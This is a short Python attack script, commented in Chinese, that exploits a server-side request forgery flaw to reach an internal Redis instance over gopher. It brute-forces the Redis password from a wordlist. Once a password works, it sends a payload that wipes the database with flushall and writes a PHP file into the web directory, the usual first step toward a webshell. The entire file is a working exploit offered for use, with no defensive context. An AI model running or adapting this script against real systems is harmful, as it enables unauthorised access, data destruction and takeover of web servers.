#!/usr/bin/python
# -*- coding: UTF-8 -*-
import urllib.request
import sys
from urllib.parse import quote

url = sys.argv[1]
gopher = sys.argv[2]
a = sys.argv[3]

def get_password(txt):
    f = open(txt,"r")
    return f.readlines()

def encoder_url(data):
    encoder = ""
    for single_char in data:
        # 先转为ASCII
        encoder += str(hex(ord(single_char)))
    encoder = encoder.replace("0x","%").replace("%a","%0d%0a")
    return encoder

for password in get_password(a):
    # 攻击脚本
    data = """
    auth %s
    quit
    """ % password        #不断的用字典中的密码去替换
    
    getshell = """
    auth %s
    flushall
    set mars "\\n\\n<?php phpinfo();?>\\n\\n"
    config set dir /html
    config set dbfilename dms.php
    save
    quit
    """%password
    # 二次编码
    encoder = encoder_url(encoder_url(data))
    # 生成payload
    payload = url + quote(gopher,'utf-8') + encoder

    # 发起请求
    request = urllib.request.Request(payload)
    response = urllib.request.urlopen(request).read()
    if response.decode().count("+OK") > 1:
        print("find password : " + password)
        #print(getshell)
        encoder_2 = encoder_url(encoder_url(getshell))
        payload_2 = url + quote(gopher,'utf-8')+encoder_2
        #print(payload_2)
        request = urllib.request.Request(payload_2)
        response = urllib.request.urlopen(request).read()
        print("getshell的数据包已发送！")
        
        

'''
前提
1.知道ssrf的注入点
2.知道redis的地址和端口号
'''